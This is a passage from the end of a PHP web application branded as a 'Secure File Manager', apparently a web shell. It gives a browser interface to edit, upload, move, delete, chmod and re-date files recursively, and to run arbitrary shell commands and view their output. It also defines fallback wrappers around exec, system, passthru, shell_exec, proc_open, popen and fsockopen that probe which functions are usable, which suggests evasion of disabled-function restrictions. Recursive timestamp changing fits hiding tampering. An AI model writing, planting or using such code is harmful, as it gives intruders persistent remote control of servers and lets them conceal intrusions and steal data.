                        <button type="button" class="btn btn-xs btnw" onclick="toggleRow('rn-<?php echo h($name); ?>')">Rename</button>
                        <button type="button" class="btn btn-xs btnw" onclick="toggleRow('cm-<?php echo h($name); ?>')">Chmod</button>
                        <button type="button" class="btn btn-xs btnw" onclick="toggleRow('mt-<?php echo h($name); ?>')">Change Date</button>

                        <form method="post" action="?a=delete&p=<?php echo rawurlencode($current); ?>" onsubmit="return confirm('Delete this directory (recursive)?')" class="inline">
                          <input type="hidden" name="csrf" value="<?php echo h($csrf); ?>">
                          <input type="hidden" name="target" value="<?php echo h($name); ?>">
                          <button class="btn btn-xs btnw" type="submit">Delete</button>
                        </form>
                      </div>

                      <div id="rn-<?php echo h($name); ?>" class="hidden mt-2">
                        <form method="post" action="?a=rename&p=<?php echo rawurlencode($current); ?>" class="flex flex-wrap gap-2">
                          <input type="hidden" name="csrf" value="<?php echo h($csrf); ?>">
                          <input type="hidden" name="old" value="<?php echo h($name); ?>">
                          <input type="text" name="new" class="field w-48" placeholder="New name">
                          <button class="btn btn-sm btnw" type="submit">OK</button>
                          <button class="btn btn-sm btnw btn-ghost" type="button" onclick="closeAction(this)">Cancel</button>
                        </form>
                      </div>

                      <div id="cm-<?php echo h($name); ?>" class="hidden mt-2">
                        <form method="post" action="?a=chmod&p=<?php echo rawurlencode($current); ?>" class="flex flex-wrap gap-2 items-center">
                          <input type="hidden" name="csrf" value="<?php echo h($csrf); ?>">
                          <input type="hidden" name="target" value="<?php echo h($name); ?>">
                          <input type="text" name="mode" class="field w-28 mono" placeholder="0755">
                          <label class="text-xs flex items-center gap-1"><input type="checkbox" name="recursive"> recursive</label>
                          <button class="btn btn-sm btnw" type="submit">OK</button>
                          <button class="btn btn-sm btnw btn-ghost" type="button" onclick="closeAction(this)">Cancel</button>
                        </form>
                      </div>

                      <div id="mt-<?php echo h($name); ?>" class="hidden mt-2">
                        <form method="post" action="?a=mtime&p=<?php echo rawurlencode($current); ?>" class="flex flex-wrap gap-2 items-center">
                          <input type="hidden" name="csrf" value="<?php echo h($csrf); ?>">
                          <input type="hidden" name="target" value="<?php echo h($name); ?>">
                          <input type="text" name="ts" class="field w-56 mono" placeholder="YYYY-MM-DD HH:MM:SS or epoch" required>
                          <label class="text-xs flex items-center gap-1"><input type="checkbox" name="recursive" checked> recursive</label>
                          <button class="btn btn-sm btnw" type="submit">OK</button>
                          <button class="btn btn-sm btnw btn-ghost" type="button" onclick="closeAction(this)">Cancel</button>
                        </form>
                      </div>
                    </td>
                  </tr>
                <?php endforeach; ?>

                <?php foreach ($files as $name): $full = $current . DIRECTORY_SEPARATOR . $name; $size = (int)@filesize($full); $mtime = (int)@filemtime($full); $ext=strtolower(pathinfo($full, PATHINFO_EXTENSION));
                      $r = @is_readable($full); $w = @is_writable($full);
                      $permColorClass = $w ? 'text-lime-400' : ($r ? 'text-white' : 'text-red-400');
                ?>
                  <tr class="border-b border-slate-800 hoverable"
                      data-type="file"
                      data-name="<?php echo h(strtolower($name)); ?>"
                      data-size="<?php echo $size; ?>"
                      data-mtime="<?php echo $mtime; ?>"
                      draggable="true"
                      ondragstart="onDragStartItem(event, <?php echo je($name); ?>)">
                    <td class="py-2 px-2"><input class="rowchk" type="checkbox" name="items[]" value="<?php echo h($name); ?>"></td>
                    <td class="py-2 px-2">
                      <div class="flex items-center gap-2 <?php echo $permColorClass; ?>">
                        <?php echo iconSvgFor($full); ?>
                        <a class="font-medium hover:underline text-white"
                           draggable="false"
                           onclick="return guardLinkCopy(event)"
                           href="?a=view&f=<?php echo rawurlencode($name); ?>&p=<?php echo rawurlencode($current); ?>">
                          <?php echo h($name); ?>
                        </a>
                      </div>
                    </td>
                    <td class="py-2 px-2 mono"><?php echo h(humanSize($size)); ?></td>
                    <td class="py-2 px-2 mono <?php echo $permColorClass; ?>"><?php echo h(permsToString($full)); ?></td>
                    <td class="py-2 px-2"><?php echo h(date('Y-m-d H:i:s', $mtime ?: time())); ?></td>
                    <td class="py-2 px-2">
                      <div class="row-actions">
                        <a class="btn btn-xs btnw" href="?a=edit&f=<?php echo rawurlencode($name); ?>&p=<?php echo rawurlencode($current); ?>">Edit</a>
                        <a class="btn btn-xs btnw" href="?a=download&f=<?php echo rawurlencode($name); ?>&p=<?php echo rawurlencode($current); ?>">Download</a>

                        <button type="button" class="btn btn-xs btnw" onclick="toggleRow('rn-<?php echo h($name); ?>')">Rename</button>
                        <button type="button" class="btn btn-xs btnw" onclick="toggleRow('cm-<?php echo h($name); ?>')">Chmod</button>
                        <button type="button" class="btn btn-xs btnw" onclick="toggleRow('mt-<?php echo h($name); ?>')">Change Date</button>

                        <?php if (in_array($ext,array('zip')) || preg_match('~\.(tar|tar\.gz|tar\.bz2|tar\.xz)$~i', $name)): ?>
                          <form method="post" action="?a=unzip&p=<?php echo rawurlencode($current); ?>" class="inline">
                            <input type="hidden" name="csrf" value="<?php echo h($csrf); ?>">
                            <input type="hidden" name="file" value="<?php echo h($name); ?>">
                            <button class="btn btn-xs btnw" type="submit">Unzip here</button>
                          </form>
                        <?php endif; ?>

                        <form method="post" action="?a=delete&p=<?php echo rawurlencode($current); ?>" class="inline" onsubmit="return confirm('Delete this file?')">
                          <input type="hidden" name="csrf" value="<?php echo h($csrf); ?>">
                          <input type="hidden" name="target" value="<?php echo h($name); ?>">
                          <button class="btn btn-xs btnw" type="submit">Delete</button>
                        </form>
                      </div>

                      <div id="rn-<?php echo h($name); ?>" class="hidden mt-2">
                        <form method="post" action="?a=rename&p=<?php echo rawurlencode($current); ?>" class="flex flex-wrap gap-2 mt-1">
                          <input type="hidden" name="csrf" value="<?php echo h($csrf); ?>">
                          <input type="hidden" name="old" value="<?php echo h($name); ?>">
                          <input type="text" name="new" class="field w-48" placeholder="New name">
                          <button class="btn btn-sm btnw" type="submit">OK</button>
                          <button class="btn btn-sm btnw btn-ghost" type="button" onclick="closeAction(this)">Cancel</button>
                        </form>
                      </div>

                      <div id="cm-<?php echo h($name); ?>" class="hidden mt-2">
                        <form method="post" action="?a=chmod&p=<?php echo rawurlencode($current); ?>" class="flex flex-wrap gap-2 items-center mt-1">
                          <input type="hidden" name="csrf" value="<?php echo h($csrf); ?>">
                          <input type="hidden" name="target" value="<?php echo h($name); ?>">
                          <input type="text" name="mode" class="field w-24 mono" placeholder="0644">
                          <label class="text-xs flex items-center gap-1"><input type="checkbox" name="recursive"> recursive</label>
                          <button class="btn btn-sm btnw" type="submit">OK</button>
                          <button class="btn btn-sm btnw btn-ghost" type="button" onclick="closeAction(this)">Cancel</button>
                        </form>
                      </div>

                      <div id="mt-<?php echo h($name); ?>" class="hidden mt-2">
                        <form method="post" action="?a=mtime&p=<?php echo rawurlencode($current); ?>" class="flex flex-wrap gap-2 items-center">
                          <input type="hidden" name="csrf" value="<?php echo h($csrf); ?>">
                          <input type="hidden" name="target" value="<?php echo h($name); ?>">
                          <input type="text" name="ts" class="field w-56 mono" placeholder="YYYY-MM-DD HH:MM:SS or epoch" required>
                          <label class="text-xs flex items-center gap-1 opacity-50"><input type="checkbox" disabled> recursive</label>
                          <button class="btn btn-sm btnw" type="submit">OK</button>
                          <button class="btn btn-sm btnw btn-ghost" type="button" onclick="closeAction(this)">Cancel</button>
                        </form>
                      </div>

                    </td>
                  </tr>
                <?php endforeach; ?>

                <?php if (empty($dirs) && empty($files)): ?>
                  <tr><td colspan="6" class="py-6 text-center text-slate-400">Empty</td></tr>
                <?php endif; ?>

              </tbody>
            </table>
          </div>
          <!-- below the table -->
          <div class="mt-3">
            <form method="post"
                  action="?a=zip&p=<?php echo rawurlencode($current); ?>"
                  class="inline-flex flex-wrap gap-2 items-center">
              <input type="hidden" name="csrf" value="<?php echo h($csrf); ?>">
              <input type="text" name="zipname" class="field w-56" placeholder="archive-name.zip (optional)">
              <button class="btn btn-sm btnw" type="submit" onclick="return collectSelectedInto(this.form)">Zip Selected</button>
              <span class="text-xs text-slate-400">
                If ZipArchive is unavailable, a <span class="mono">.tar</span> will be created (no compression).
              </span>
            </form>
          </div>
        </form>
      </div>
    </section>
  </main>

  <!-- Footer -->
  <footer class="w-full px-6 py-4">
    <div class="footer-line mb-3"></div>
    <div class="text-xs text-slate-400 flex items-center justify-between">
      <span>© <?php echo $yearNow; ?> SEO RADEN — Secure File Manager. All rights reserved.</span>
      <span>Built with ❤️ & Tailwind · Dark UI</span>
    </div>
  </footer>

  <script>
    document.documentElement.classList.add('dark');

    // Jangan navigasi ketika ada teks terseleksi (agar <a> gampang di-copy)
    function guardLinkCopy(e){
      var sel = '';
      if (window.getSelection) sel = String(window.getSelection());
      if (sel && sel.length > 0){
        e.preventDefault();
        return false;
      }
      return true;
    }

    // Search filter
    const searchEl = document.getElementById('searchBox');
    function filterRows(){
      const q = (searchEl && searchEl.value || '').trim().toLowerCase();
      const rows = document.querySelectorAll('#dirBody tr');
      rows.forEach(function(r){
        var name = r.getAttribute('data-name')||'';
        r.style.display = name.indexOf(q) !== -1 ? '' : 'none';
      });
    }
    window.addEventListener('keydown', function(e){ if(e.ctrlKey && e.key === '/'){ e.preventDefault(); if(searchEl){searchEl.focus();} } });

    // Sort
    var sortState = { key:'name', asc:true };
    function sortBy(key){
      var body = document.getElementById('dirBody');
      var rows = Array.prototype.slice.call(body.querySelectorAll('tr'));
      var factor = (sortState.key===key && sortState.asc)?-1:1;
      sortState = { key: key, asc: factor===1 };
      rows.sort(function(a,b){
        if(key==='name'){ return a.dataset.name.localeCompare(b.dataset.name) * factor; }
        if(key==='size' || key==='mtime'){
          var av = parseInt(a.dataset[key]||'0',10);
          var bv = parseInt(b.dataset[key]||'0',10);
          return (av-bv) * factor;
        }
        return 0;
      });
      rows.forEach(function(r){ body.appendChild(r); });
    }

    // Checkboxes
    function toggleAll(master){ Array.prototype.forEach.call(document.querySelectorAll('.rowchk'), function(x){ x.checked = master.checked; }); }
    function selectAll(flag){ Array.prototype.forEach.call(document.querySelectorAll('.rowchk'), function(x){ x.checked = !!flag; }); var m=document.getElementById('chkAll'); if(m) m.checked=!!flag; }
    function toggleRow(id){ var el=document.getElementById(id); if(el) el.classList.toggle('hidden'); }
    function closeAction(btn){ var holder = btn.closest('div[id^="rn-"], div[id^="cm-"], div[id^="mt-"]'); if(holder) holder.classList.add('hidden'); }

    // Collect selected items for Zip form
    function collectSelectedInto(form){
      Array.prototype.forEach.call(form.querySelectorAll('input[name="items[]"]'), function(n){ n.parentNode.removeChild(n); });
      Array.prototype.forEach.call(document.querySelectorAll('#dirBody .rowchk:checked'), function(chk){
        var i = document.createElement('input');
        i.type='hidden'; i.name='items[]'; i.value=chk.value;
        form.appendChild(i);
      });
      return true;
    }

    // ===== Drag & Drop Upload =====
    var dropZone = document.getElementById('dropZone');
    var tableCard = document.getElementById('tableCard');
    var csrf = <?php echo je($csrf); ?>;
    var currentPath = <?php echo je($current); ?>;

    ['dragenter','dragover'].forEach(function(ev){
      document.addEventListener(ev, function(e){ e.preventDefault(); e.stopPropagation(); tableCard.classList.add('drop-hint'); });
    });
    ['dragleave','drop'].forEach(function(ev){
      document.addEventListener(ev, function(e){
        if(ev==='dragleave' && e.target !== document) return;
        tableCard.classList.remove('drop-hint');
      });
    });
    document.addEventListener('drop', function(e){
      if(!e.dataTransfer || !e.dataTransfer.files || e.dataTransfer.files.length===0) return;
      e.preventDefault(); e.stopPropagation();
      try{
        var fd = new FormData();
        fd.append('csrf', csrf);
        for(var i=0;i<e.dataTransfer.files.length;i++){ var f=e.dataTransfer.files[i]; fd.append('files[]', f, f.name); }
        fetch('?a=upload&p='+encodeURIComponent(currentPath), { method:'POST', body:fd })
          .then(function(){ location.href='?p='+encodeURIComponent(currentPath); })
          .catch(function(){ alert('Upload failed'); });
      }catch(err){ console.error(err); alert('Upload failed'); }
    });

    // ===== Drag to Move between directories (copy-friendly by default) =====
    var draggedItemName = null;
    var dragEnabled = false; // DEFAULT OFF → tabel mudah di-copy

    // Toggle handler
    (function(){
      var dt = document.getElementById('dragToggle');
      if (dt) {
        dragEnabled = !!dt.checked;
        dt.addEventListener('change', function(){
          dragEnabled = !!dt.checked;
        });
      }
    })();

    function onDragStartItem(ev, name){
      if (!dragEnabled) {
        ev.preventDefault();
        return false;
      }
      draggedItemName = name; ev.dataTransfer.setData('text/plain', name);
      ev.dataTransfer.effectAllowed = 'move';
    }
    function onDragOverDir(ev){
      if (!dragEnabled) return;
      ev.preventDefault(); ev.currentTarget.classList.add('droptarget');
      ev.dataTransfer.dropEffect = 'move';
    }
    function onDragLeaveDir(ev){
      ev.currentTarget.classList.remove('droptarget');
    }
    function onDropToDir(ev, dirName){
      if (!dragEnabled) return;
      ev.preventDefault();
      var row = ev.currentTarget; row.classList.remove('droptarget');
      var src = draggedItemName || ev.dataTransfer.getData('text/plain');
      if(!src) return;
      try{
        var fd = new FormData();
        fd.append('csrf', csrf);
        fd.append('src', src);
        var dstAbs = <?php echo je($current.DIRECTORY_SEPARATOR); ?> + dirName;
        fd.append('dst', dstAbs);
        fetch('?a=move&p='+encodeURIComponent(currentPath), { method:'POST', body:fd })
          .then(function(){ location.href='?p='+encodeURIComponent(currentPath); })
          .catch(function(){ alert('Move failed'); });
      }catch(err){ console.error(err); alert('Move failed'); }
    }

    // ===== CodeMirror Init (file editor text mode) =====
    <?php if ($editFile && $viewMode === 'txt'): ?>
    (function(){
      var ta = document.getElementById('editor'); if (!ta) return;
      var filename = <?php echo je(basename($editFile)); ?>;
      CodeMirror.modeURL = "https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/%N/%N.min.js";
      var info = CodeMirror.findModeByFileName(filename) || CodeMirror.findModeByMIME('text/plain');
      var cm = CodeMirror.fromTextArea(ta, {
        lineNumbers:true, styleActiveLine:true, matchBrackets:true, autoCloseBrackets:true,
        lineWrapping:true, theme:'material-darker',
        mode: (info && info.mime) ? info.mime : 'text/plain',
        viewportMargin: Infinity
      });
      if (info && info.mode) { CodeMirror.autoLoadMode(cm, info.mode); }
      var det = document.getElementById('editPanel'); if(det){ det.addEventListener('toggle', function(){ setTimeout(function(){cm.refresh();},50); }); }
      var form = document.getElementById('editForm'); if(form){ form.addEventListener('submit', function(){ cm.save(); }); }
    })();
    <?php endif; ?>

    // ===== CodeMirror untuk PREVIEW (readonly, auto-detect) =====
    (function(){
      var pre = document.getElementById('previewPre');
      if(!pre || typeof CodeMirror === 'undefined') return;

      CodeMirror.modeURL = "https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/%N/%N.min.js";
      var filename = <?php echo je($viewFile ? basename($viewFile) : ''); ?>;
      var info = (filename && CodeMirror.findModeByFileName(filename)) || CodeMirror.findModeByMIME('text/plain');

      var textValue = pre.textContent || '';
      var holder = document.createElement('div');
      pre.parentNode.replaceChild(holder, pre);

      var cmPrev = CodeMirror(holder, {
        value: textValue,
        readOnly: true,
        lineNumbers: true,
        lineWrapping: true,
        theme: 'material-darker',
        mode: (info && info.mime) ? info.mime : 'text/plain',
        viewportMargin: Infinity
      });

      if (info && info.mode) CodeMirror.autoLoadMode(cmPrev, info.mode);
      cmPrev.setSize('100%', 480);

      var det = document.getElementById('previewPanel');
      if (det) det.addEventListener('toggle', function(){ setTimeout(function(){ cmPrev.refresh(); }, 50); });
      window.addEventListener('resize', function(){ cmPrev.refresh(); });
    })();

    // ===== CodeMirror untuk RUN COMMAND (single-line + placeholder) =====
    (function(){
      var ta = document.getElementById('cmdTA');
      if(!ta || typeof CodeMirror === 'undefined') return;

      CodeMirror.modeURL = "https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/%N/%N.min.js";
      var isWin = <?php echo je(DIRECTORY_SEPARATOR === '\\'); ?>;
      var cmdMode = isWin ? 'powershell' : 'shell';

      var cmCmd = CodeMirror.fromTextArea(ta, {
        lineNumbers: false,
        styleActiveLine: true,
        matchBrackets: true,
        autoCloseBrackets: true,
        lineWrapping: false,
        theme: 'material-darker',
        mode: cmdMode,
        viewportMargin: Infinity,
        placeholder: 'Run Command'
      });

      CodeMirror.autoLoadMode(cmCmd, cmdMode);
      cmCmd.setSize('100%', 36);
      cmCmd.getWrapperElement().classList.add('cm-cmd-input');

      cmCmd.on('beforeChange', function(cm, change){
        var hasNewline = change.text && (change.text.length > 1 || /\r|\n/.test(change.text[0]));
        if (hasNewline) change.update(change.from, change.to, [' ']);
      });

      cmCmd.on('keydown', function(cm, e){
        if ((e.ctrlKey || e.metaKey) && e.key === 'Enter') {
          e.preventDefault();
          var form = document.getElementById('cmdForm');
          if (form) form.submit();
        }
      });

      var form = document.getElementById('cmdForm');
      if (form) { form.addEventListener('submit', function(){ cmCmd.save(); }); }

      setTimeout(function(){ cmCmd.refresh(); }, 50);
      window.addEventListener('resize', function(){ cmCmd.refresh(); });
    })();

    // ===== CodeMirror untuk COMMAND OUTPUT =====
    (function(){
      var pre = document.getElementById('cmdOutPre');
      if(!pre || typeof CodeMirror === 'undefined') return;

      CodeMirror.modeURL = "https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/%N/%N.min.js";
      var isWin = <?php echo je(DIRECTORY_SEPARATOR === '\\'); ?>;
      var outMode = isWin ? 'powershell' : 'shell';

      var txt = pre.textContent || '';
      var holder = document.createElement('div');
      pre.parentNode.replaceChild(holder, pre);

      var cmOut = CodeMirror(holder, {
        value: txt,
        readOnly: true,
        lineNumbers: true,
        lineWrapping: true,
        theme: 'material-darker',
        mode: outMode,
        viewportMargin: Infinity
      });

      CodeMirror.autoLoadMode(cmOut, outMode);
      cmOut.setSize('100%', 380);
      cmOut.getWrapperElement().classList.add('cm-cmd-output');

      setTimeout(function(){ cmOut.refresh(); }, 50);
      window.addEventListener('resize', function(){ cmOut.refresh(); });
    })();
  </script>
</body>
</html>
<?php
/* ============================================================
 * OPTIONAL WRAPPERS (fx_*) if you need replacements elsewhere
 * ============================================================ */

/* stream_socket_client fallback via fsockopen */
if (!function_exists('fx_stream_socket_client')) {
    function fx_stream_socket_client($remote_socket, &$errno=null, &$errstr=null, $timeout=30, $flags=0, $context=null) {
        if (is_fn_usable('stream_socket_client')) {
            return @stream_socket_client($remote_socket, $errno, $errstr, $timeout, $flags, $context);
        }
        if (is_fn_usable('fsockopen')) {
            $host = $remote_socket; $port = 0;
            if (stripos($remote_socket, 'tcp://') === 0 || stripos($remote_socket, 'ssl://') === 0 || stripos($remote_socket, 'tls://')===0) {
                $tmp = parse_url($remote_socket);
                if ($tmp && isset($tmp['host']) && isset($tmp['port'])) { $host=$tmp['host']; $port=$tmp['port']; }
            } else if (strpos($remote_socket, ':') !== false) {
                $parts = explode(':',$remote_socket,2); $host=$parts[0]; $port=(int)$parts[1];
            }
            return @fsockopen($host, $port ? $port : 80, $errno, $errstr, $timeout);
        }
        $errno = 0; $errstr = 'No socket functions available';
        return false;
    }
}

if (!function_exists('fx_ini_restore')) {
    function fx_ini_restore($varname) {
        if (is_fn_usable('ini_restore')) return @ini_restore($varname);
        return false; // no-op
    }
}

if (!function_exists('fx_gzinflate')) {
    function fx_gzinflate($data, $length = 0) {
        if (is_fn_usable('gzinflate')) return @gzinflate($data, $length);
        if (is_fn_usable('gzdecode')) return @gzdecode($data);
        if (is_fn_usable('gzuncompress')) return @gzuncompress($data);
        return false;
    }
}

if (!function_exists('fx_exec')) {
    function fx_exec($cmd, &$output=null, &$return_var=null) {
        if (is_fn_usable('exec')) return @exec($cmd, $output, $return_var);
        $output = array(); $return_var = 127; return null;
    }
}
if (!function_exists('fx_passthru')) {
    function fx_passthru($cmd, &$return_var=null) {
        if (is_fn_usable('passthru')) return @passthru($cmd, $return_var);
        $return_var = 127; return null;
    }
}
if (!function_exists('fx_shell_exec')) {
    function fx_shell_exec($cmd) {
        if (is_fn_usable('shell_exec')) return @shell_exec($cmd);
        return null;
    }
}
if (!function_exists('fx_system')) {
    function fx_system($cmd, &$return_var=null) {
        if (is_fn_usable('system')) return @system($cmd, $return_var);
        $return_var = 127; return null;
    }
}
if (!function_exists('fx_proc_open')) {
    function fx_proc_open($cmd, $descriptorspec, &$pipes, $cwd=null, $env=null) {
        if (is_fn_usable('proc_open')) return @proc_open($cmd, $descriptorspec, $pipes, $cwd, $env);
        return false;
    }
}
if (!function_exists('fx_popen')) {
    function fx_popen($cmd, $mode) {
        if (is_fn_usable('popen')) return @popen($cmd, $mode);
        return false;
    }
}

if (!function_exists('fx_parse_ini_file')) {
    function fx_parse_ini_file($filename, $process_sections = false, $scanner_mode = null) {
        if (is_fn_usable('parse_ini_file')) {
            if ($scanner_mode === null) return @parse_ini_file($filename, $process_sections);
            return @parse_ini_file($filename, $process_sections, $scanner_mode);
        }
        $s = @file_get_contents($filename);
        if ($s === false) return false;
        if (is_fn_usable('parse_ini_string')) return @parse_ini_string($s, $process_sections);
        return false;
    }
}

if (!function_exists('fx_show_source')) {
    function fx_show_source($file, $return=false) {
        if (is_fn_usable('show_source')) return @show_source($file, $return);
        if (is_fn_usable('highlight_file')) return @highlight_file($file, $return);
        $c = @file_get_contents($file);
        if ($return) return $c;
        echo $c; return true;
    }
}

if (!function_exists('fx_scandir')) {
    function fx_scandir($dir) {
        if (is_fn_usable('scandir')) return @scandir($dir);
        $h = @opendir($dir); if (!$h) return false;
        $out = array(); while(false!==($e=readdir($h))) $out[]=$e; closedir($h); return $out;
    }
}

if (!function_exists('fx_posix_getpwuid')) {
    function fx_posix_getpwuid($uid) {
        if (is_fn_usable('posix_getpwuid')) return @posix_getpwuid($uid);
        return array('name'=>@get_current_user(), 'uid'=>$uid);
    }
}
if (!function_exists('fx_posix_getgrgid')) {
    function fx_posix_getgrgid($gid) {
        if (is_fn_usable('posix_getgrgid')) return @posix_getgrgid($gid);
        return array('name'=>'unknown','gid'=>$gid);
    }
}

if (!function_exists('fx_diskfreespace')) {
    function fx_diskfreespace($directory) {
        if (is_fn_usable('diskfreespace')) return @diskfreespace($directory);
        if (is_fn_usable('disk_free_space')) return @disk_free_space($directory);
        return false;
    }
}

if (!function_exists('fx_filegroup')) {
    function fx_filegroup($filename) {
        if (is_fn_usable('filegroup')) return @filegroup($filename);
        return false;
    }
}

if (!function_exists('fx_ftp_connect')) {
    function fx_ftp_connect($host, $port=21, $timeout=90) {
        if (is_fn_usable('ftp_connect')) return @ftp_connect($host, $port, $timeout);
        if (is_fn_usable('fsockopen')) return @fsockopen($host, $port, $errno, $errstr, $timeout);
        return false;
    }
}

if (!function_exists('fx_stream_get_contents')) {
    function fx_stream_get_contents($handle, $maxlength = -1, $offset = -1) {
        if (is_fn_usable('stream_get_contents')) return @stream_get_contents($handle, $maxlength, $offset);
        if ($offset > 0) @fseek($handle, $offset);
        $data = '';
        if ($maxlength === -1) {
            while(!feof($handle)) { $data .= @fread($handle, 8192); }
        } else {
            $data = @fread($handle, $maxlength);
        }
        return $data;
    }
}